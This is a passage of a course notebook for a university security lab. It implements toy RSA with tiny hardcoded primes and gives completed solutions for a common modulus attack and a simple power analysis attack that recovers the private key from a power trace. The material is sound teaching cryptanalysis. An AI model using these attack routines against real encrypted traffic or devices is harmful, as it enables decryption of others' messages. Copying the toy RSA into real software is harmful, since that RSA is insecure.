        "The reason why this works is because *d* and *e* are selected in a way that ($d$ * $e$)  1 mod Φ(n), where Φ(n) (pronounced as 'phi') is the [Euler Totient Function](https://www.geeksforgeeks.org/eulers-totient-function/) of $n$. Here, $d$ is considered the [modular multiplicative inverse](https://www.geeksforgeeks.org/multiplicative-inverse-under-modulo-m/) of $e$ mod Φ(n).\n",
        "\n",
        "Based on this concept, please complete the `encrypt()` and `decrypt()` functions in the following cell:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iUHEStejV2kG",
        "outputId": "ded5d268-095a-4522-9d5d-fe1d461bf607"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Public Key (e, n): (5, 7990271)\n",
            "Private Key (d, n): (1596269, 7990271)\n",
            "Original Message: 123\n",
            "Encrypted Message: 3332110\n",
            "Decrypted Message (Should be the same as the original): 123\n"
          ]
        }
      ],
      "source": [
        "def power(base, exp, m):\n",
        "    res = 1\n",
        "    base = base % m\n",
        "    while exp > 0:\n",
        "        if exp & 1:\n",
        "            res = (res * base) % m\n",
        "        base = (base * base) % m\n",
        "        exp = exp // 2\n",
        "    return res\n",
        "\n",
        "# Function to find modular inverse of e modulo phi(n)\n",
        "# Here we are calculating phi(n) using Hit and Trial Method\n",
        "# but we can optimize it using Extended Euclidean Algorithm\n",
        "def modInverse(e, phi):\n",
        "    for d in range(2, phi):\n",
        "        if (e * d) % phi == 1:\n",
        "            return d\n",
        "    return -1\n",
        "\n",
        "# RSA Key Generation (p and q are hardcoded for now)\n",
        "def generateKeys():\n",
        "    p = 7919\n",
        "    q = 1009\n",
        "\n",
        "    n = p * q\n",
        "    phi = (p - 1) * (q - 1)\n",
        "\n",
        "    # Choose e, where 1 < e < phi(n) and gcd(e, phi(n)) == 1\n",
        "    e = 0\n",
        "    for e in range(2, phi):\n",
        "        if gcd(e, phi) == 1:\n",
        "            break\n",
        "\n",
        "    # Compute d such that e * d ≡ 1 (mod phi(n))\n",
        "    d = modInverse(e, phi)\n",
        "\n",
        "    return e, d, n\n",
        "\n",
        "# Function to calculate gcd\n",
        "def gcd(a, b):\n",
        "    while b != 0:\n",
        "        a, b = b, a % b\n",
        "    return a\n",
        "\n",
        "# TODO: Encrypt message using public key (e, n)\n",
        "def encrypt(m, e, n):\n",
        "    if m >= n:\n",
        "        raise ValueError(\"Message too large for the given key size\")\n",
        "    return power(m, e, n)\n",
        "\n",
        "# TODO: Decrypt message using private key (d, n)\n",
        "def decrypt(c, d, n):\n",
        "    return power(c, d, n)\n",
        "\n",
        "# Main execution\n",
        "if __name__ == \"__main__\":\n",
        "\n",
        "    # Key Generation\n",
        "    e, d, n = generateKeys()\n",
        "\n",
        "    print(f\"Public Key (e, n): ({e}, {n})\")\n",
        "    print(f\"Private Key (d, n): ({d}, {n})\")\n",
        "\n",
        "    # Message\n",
        "    M = 123\n",
        "    print(f\"Original Message: {M}\")\n",
        "\n",
        "    # Encrypt the message\n",
        "    C = encrypt(M, e, n)\n",
        "    print(f\"Encrypted Message: {C}\")\n",
        "\n",
        "    # Decrypt the message\n",
        "    decrypted = decrypt(C, d, n)\n",
        "    print(f\"Decrypted Message (Should be the same as the original): {decrypted}\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NOTRzkrJSbNY"
      },
      "source": [
        "### Step 2.1: Common Modulus Attack\n",
        "\n",
        "Suppose that Bob want’s to communicate with Alice and uses Alice’s public key (n, e₁) to encrypt messages with RSA. As always, Eve is eavesdropping on the messages. He sends a couple of messages successfully, but after a while due to a CPU overheating (or some other random reason) a bit has been flipped unexpectedly and the message is encrypted with a a faulty public key (n, e₂).\n",
        "\n",
        "So given that Eve has access on the two different ciphertexts of the same message M that have been encrypted with different exponent but common modulus:\n",
        "\n",
        "#### ct₁ = E₍ₙ, ₑ₁₎(M)\n",
        "\n",
        "#### ct₂ = E₍ₙ, ₑ₂₎(M)\n",
        "\n",
        "She can recover the plaintext if gcd(e₁, e₂) = 1 and gcd(ct₂, n)=1"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "x1NIegLbj7KY"
      },
      "source": [
        "#### The Math Behind the Common Modulus Attack\n",
        "\n",
        "Recall that the RSA encryption works as follows:\n",
        "\n",
        "**$C$ = $M^e$ mod $n$**\n",
        "\n",
        "Here, we need to use a theorem called [Bezout's Theorem](https://math.mit.edu/~lguth/PolyMethod/lect13.pdf). You do not need to know all the details. In short, Bezout’s Theorem states that, if there are integers a and b, which are not both zero, then there are integers x and y such that:\n",
        "\n",
        "**$xa$ + $yb$ = $gcd(a, b)$**\n",
        "\n",
        "\n",
        "Back in our context, if gcd($e₁$, $e₂$)=1, then we have integers x and y such that:\n",
        "\n",
        "**$xe₁$ + $ye₂$ = 1**\n",
        "\n",
        "\n",
        "Now, by using the [Extended Euclidean algorithm](https://www.geeksforgeeks.org/euclidean-algorithms-basic-and-extended/) we can find x and y and then is easy to show that the plaintext can be recovered as follows (all math performed in the common modulo):\n",
        "\n",
        "**${ct_1}^x$ * ${ct_2}^y$ = $(M^{e_1})^x$ * $(M^{e_2})^y$ mod $n$ = $M^{({e_1}x + {e_2}y)}$ mod $n$\n",
        "= $M$ mod $n$**\n",
        "\n",
        "Although the equation seems straightforward, is a little bit more complicated to evaluate it as normally y will be a negative integer. As such, ${{ct}_2}^y$ must be evaluated as follows:\n",
        "\n",
        "${{ct}_2}^y$ = $(1/{{ct}_2})^{-y}$\n",
        "\n",
        "where $1/{{ct}_2}$ is the multiplicative inverse of ${{ct}_2}$. For instance, suppose that we are operating in mod 7 (Z₇). The fraction 1/2 (2⁻¹) is in fact the multiplicative inverse of 2 which in that case is 4 (2x4 = 1 (mod 7)). Now here is the catch! According to Bezout's Theorem, if the denominator a and the modulus n are not co primes then the denominator is not invertible mod n. In other words the fraction 1/a is not valid. Something like dividing by 0 in regular arithmetic. So, for making ${{ct}_2}$ invertible in mod n, gcd(${{ct}_2}$, n)=1 must also hold (co-primes).\n",
        "\n",
        "Now, in the following cell, please write the code to attack:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "tp-iGuNLq_Hg"
      },
      "outputs": [],
      "source": [
        "import math\n",
        "\n",
        "def egcd(a, b):\n",
        "    if a == 0:\n",
        "        return (b, 0, 1)\n",
        "    else:\n",
        "        g, y, x = egcd(b % a, a)\n",
        "        return (g, x - (b // a) * y, y)\n",
        "\n",
        "def modinv(a, m):\n",
        "    g, x, y = egcd(a, m)\n",
        "    if g != 1:\n",
        "        raise ValueError('Modular inverse does not exist.')\n",
        "    else:\n",
        "        return x % m\n",
        "\n",
        "\n",
        "def attack(c1, c2, e1, e2, N):\n",
        "    if math.gcd(e1, e2) != 1:\n",
        "        raise ValueError(\"Exponents e1 and e2 must be coprime\")\n",
        "    if math.gcd(e1, e2) != 1:\n",
        "        raise ValueError(\"Exponents e1 and e2 must be coprime\")\n",
        "\n",
        "    if math.gcd(c2, N) != 1:\n",
        "        raise ValueError(\"gcd(c2, N) must be 1\")\n",
        "\n",
        "    # Find coefficients a, b such that a*e1 + b*e2 = 1\n",
        "    _, a, b = egcd(e1, e2)\n",
        "\n",
        "    # Check if c1 is invertible if a is negative\n",
        "    if a < 0 and math.gcd(c1, N) != 1:\n",
        "        raise ValueError(\"c1 is not invertible modulo N\")\n",
        "\n",
        "    # Calculate c1^a mod N\n",
        "    if a < 0:\n",
        "        c1_inv = modinv(c1, N)\n",
        "        c1_result = pow(c1_inv, -a, N)\n",
        "    else:\n",
        "        c1_result = pow(c1, a, N)\n",
        "\n",
        "    # Calculate c2^b mod N\n",
        "    if b < 0:\n",
        "        c2_inv = modinv(c2, N)\n",
        "        c2_result = pow(c2_inv, -b, N)\n",
        "    else:\n",
        "        c2_result = pow(c2, b, N)\n",
        "\n",
        "    # Combine to recover the original message: M = c1^a * c2^b mod N\n",
        "    plaintext = (c1_result * c2_result) % N\n",
        "\n",
        "    return plaintext"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Dt0AG1-HrOK7"
      },
      "source": [
        "Now let's check the attack with some sample input:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pMOfBIQhrM_T",
        "outputId": "1e05d215-8b3a-46ff-ce91-bef4f6275356"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Decrypted Message: 126207244316550804821666916\n"
          ]
        }
      ],
      "source": [
        "n = 103109065902334620226101162008793963504256027939117020091876799039690801944735604259018655534860183205031069083254290258577291605287053538752280231959857465853228851714786887294961873006234153079187216285516823832102424110934062954272346111907571393964363630079343598511602013316604641904852018969178919051627\n",
        "ct1 = 98165528588897581357762737834689451362252757422664514540538121132831138195216264938258509140640778717781569080958991098729015566777580593509402612574625430419832053337731308491289074351255823858676879185727045495590514663530030231806055096448879914474800546120932100906434044055982738517132870631903309747388\n",
        "e1 = 13\n",
        "ct2 = 102475188247563848286945915380476667802602854876368431885335322709108972931825158123667293750369168229919151668978059761534237040449685498674713242003659107451198242719915205456598334223051250662805244834468165714315564160456345356775214718947496000390960566077219957635569079685758176360540536491609062295912\n",
        "e2 = 15\n",
        "print(f\"Decrypted Message: {attack(ct1, ct2, e1, e2, n)}\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DwEJAm8RvLji"
      },
      "source": [
        "### Step 2.2 Power Analysis Attack"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gO4gYBhewLng"
      },
      "source": [
        "In this step, we are exploring a different class of attacks called side channel attacks. When a computer is decrypting with RSA, it emits extra information such as power consumption which can reveal the decryption key ($d$). Let's recall that the decryption of RSA works as follows:\n",
        "\n",
        "**$M$ = $C^d$ mod $n$**\n",
        "\n",
        "In real implementation, the exponential part will be computed bit-by-bit based on each bit of $d$. According to each bit of $d$, different operations are performed:\n",
        "\n",
        "\n",
        "\n",
        "*   If the bit is 0: Only one `square` operation is performed.\n",
        "*   If the bit is 1: A `square` operation is performed, followed by a `multiply` operation.\n",
        "\n",
        "In this case, we can observe higher power consumption when the bit being processed in $d$ is 1, and lower power consumption when the bit being processed in 0. In this step, you will analyze the following power consumption traces and recover the decryption key ($d$).\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lBejZ9rQvMXO",
        "outputId": "d14ffd46-e4aa-41a2-8aed-40ba29bd209f"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "--2025-03-12 05:38:42--  https://github.com/chiache/csce713-assignments/raw/master/lab3/ptrace.trc\n",
            "Resolving github.com (github.com)... 140.82.114.3\n",
            "Connecting to github.com (github.com)|140.82.114.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/chiache/csce713-assignments/master/lab3/ptrace.trc [following]\n",
            "--2025-03-12 05:38:43--  https://raw.githubusercontent.com/chiache/csce713-assignments/master/lab3/ptrace.trc\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 47033 (46K) [text/plain]\n",
            "Saving to: ‘ptrace.trc’\n",
            "\n",
            "ptrace.trc          100%[===================>]  45.93K  --.-KB/s    in 0.01s   \n",
            "\n",
            "2025-03-12 05:38:43 (3.57 MB/s) - ‘ptrace.trc’ saved [47033/47033]\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!wget -O ptrace.trc https://github.com/chiache/csce713-assignments/raw/master/lab3/ptrace.trc"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Mf0FBtWn9vE1"
      },
      "source": [
        "Now, finish the following Python code to analyze the power trace and recover the key."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "p5KDe9UIc4O7",
        "outputId": "f9e1fe11-32e8-4786-8486-e09ce1dcc61c"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Overwriting ptrace-input.txt\n"
          ]
        }
      ],
      "source": [
        "%%writefile ptrace-input.txt\n",
        "4916db7caa1a0dfd3e9b9c7a2aa2bd68d15fc6771a4a75fc00d47cc40f81612854c3dad7f6b275d3d38925a0d44abb9ebd83db256919cc71a47ac84328f840ff6e3e6797ba05d78c57a0cc79722c0dca8c8ff48b74152040462ff445e44388f57a12585fac97a3ca2675c98154d47bf10976ebf0926e6bc2694b04194b2653308e7577da48497fbd88a0a97b20d09421ff9a0ad8ec7ebc67c9c61fd9cb54ef1e825ac5352b689b0d193e70db1c17af8967d93b71b865b81f8ec6db7a39e4fbb830ec2ed0f1ae8d3ae832e0b3b03904b7b46010669a5beb85352fe6f7c0f442ae01fd1376c9c2062b905da18516a90d780e416fc55235b3bd32595031821cc025b32bdcc01cfa5164047a2ceba7a77057a5464cfeb78ddf5145eb88024fc1932322edb501eb3bcf8d585dbdbe4b443542eea4f923611692e399d3cda77bcbcb8e94ce3c6245aaddfc799b6fe2be6e53ae098b2dfc0439ace971f43820173b8a1c5ef54352f714b53c29f3cf0fd88710e71042d7a89bebe34b0ee8713f47b44a6b3f89bcd85366b27e78a2f70d4b1135a3eecddd09d025176abfd15658b20cc75aa173d7998d3de2184b6d9fa8a8cd2591e98164e52a71698b24069c56eb4e549114f484e3cf5644f15dad5c5beb96fbbe83d6b3239af16b700cfbaa7086fc24f85e4c60d4d66ca6e7cc66f5ed48b9fde8937e0df7d86c68bb3b2a7edacaf157a8\n",
        "adc2c22676ab14b78b7659f8a75856c79a54dce49523af451723669aa065ae6b32e826a810ae3ee2ff33483da8a8c1af20de575e09106462edeee5e4e92346ffcfd1ee352e07700cc2f6b8c4a2a6cc37c61fcdad0202c8504e7619f66d319e4ececdeffc379e4ac4de6761a2f279e2ba36debff57d56a953a14ef3bd27ee08747f7027b75e4f0e1730a03b566e183e2410b6d107f1fed4ab83cdbb5ef03d382d236dc91b924ad127cab4d482bf6d296f3d21bb1dce1d92f079899d3cc5ccbe2dc4e9b4653058af2d24fb096ecdec40c3ac678a74ac7e0e5c26b26cc7698d051892c00426cf39db9309e016216a3f8eaff275624b4cf160b373f240f9e6f6165cea30be8f496d00f77dd2eef66042c62054c70f25c0bad2c8f775f16fb521656a9803232ad32ed272220d2a5c795baf2c5d6076d09f32d4b56390129ed49904009be0cd4db5f25f269e239389b6ae42d6634bb9dceb4e9ff4c8918a384229fcea65d7f6812026edeb256759ef6c58f78897242105bb255c69b37d5fe80ebe10485bf351b86738409bc5894d6a045f18b07181283892ac724b65ea76daf36b995953657d2142564626104f77e3b25265ee383928dfbd1966f208fb17bd6a7d4619dc4ac5edf1705ecfeb5f5e8faa0a1a4907ff997232820a8079044ca5670b1b0fc4191c9297fb624d7f5c7ea6ec537aedea29265d827d482abb6415aa5ec5f761"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "u9IcujEOu90K",
        "outputId": "c7661e8d-2968-43c6-a770-860f2ce5b226"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "One does not simply break RSA! or maybe can, i dunno\n"
          ]
        }
      ],
      "source": [
        "def findKey(ptrace):\n",
        "    \"\"\"\n",
        "        * Finds decryption key (d) by checking the ptrace.\n",
        "        * Simply exploits the \"exponentiation by squaring\" (or square and multiply) implementation of decryption process\n",
        "        * If a only a square operation is done (during iteration over the bits of d)\n",
        "               then corresponding bit is 0\n",
        "               o/w (both square ana multiply operation) then the corresponding bit is 1 in d\n",
        "    :param ptrace: ptrace of decryption process as lst\n",
        "    :return: d\n",
        "    \"\"\"\n",
        "    # Compute a threshold to distinguish between a pure square vs. square+multiply operation.\n",
        "    threshold = (max(ptrace) + min(ptrace)) / 2\n",
        "\n",
        "    # Extract bits based on the threshold\n",
        "    bits = []\n",
        "    for pt in ptrace:\n",
        "        if pt > threshold:\n",
        "            bits.append('1')\n",
        "        else:\n",
        "            bits.append('0')\n",
        "\n",
        "    # Return the binary string representation of the decryption key.\n",
        "    return ''.join(bits)\n",
        "\n",
        "\n",
        "def powerAnalysisAttack(ptrace, c, n):\n",
        "    \"\"\"\n",
        "        Exploits RSA implementation by conducting a power analysis on decryption process.\n",
        "            * Given c,n and ptrace of decryption process, this exploit tries to determine the decryption exponent (d)\n",
        "            by analyzing the power changes during decryption.\n",
        "            * After capturing d, m is decrypted easily as: m = c^d (mod n)\n",
        "    :param ptrace: ptrace of decryption process as lst\n",
        "    :param c: cipher text\n",
        "    :param n: modulus\n",
        "    :return: m (decrypted message)\n",
        "    \"\"\"\n",
        "    d = int(findKey(ptrace), 2)\n",
        "    m = decrypt(c, d, n)\n",
        "    return m\n",
        "\n",
        "\n",
        "\"\"\"\n",
        "    Provide a \"ptrace.trc\" file that contains ptrace of decryption process\n",
        "    Also provide c and n (one by one) from stdin\n",
        "    m will be printed to stdout\n",
        "\"\"\"\n",
        "with open(\"ptrace.trc\", \"r\") as inp:\n",
        "    ptraceLst = list(map(float, inp.readlines()))\n",
        "with open(\"ptrace-input.txt\", \"r\") as inp:\n",
        "  c = int(inp.readline(), 16)\n",
        "  n = int(inp.readline(), 16)\n",
        "msgAsInt = powerAnalysisAttack(ptraceLst, c, n)\n",
        "print(bytes.fromhex(hex(msgAsInt).lstrip('0x')).decode('utf-8'))"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UE_E7hvHaS4s"
      },
      "source": [
        "## Submission\n",
        "\n",
        "Once you have finished this notebook, click \"File > Download > Download as .ipynb\" and upload the file to **Assignment 3** on Microsoft Teams and click \"Turn In\"."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "fDOb-tH0abac"
      },
      "source": [
        "## Reference\n",
        "\n",
        "*   https://tc.gts3.org/cs6265/2019/tut/tut05-fmtstr.html\n",
        "*   [Stack Smashing as of Today](https://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-slides.pdf)\n",
        "*   [The Advanced Return-into-lib(c) Exploits](http://phrack.org/issues/58/4.html)\n",
        "*   [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "toc_visible": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.10.17"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
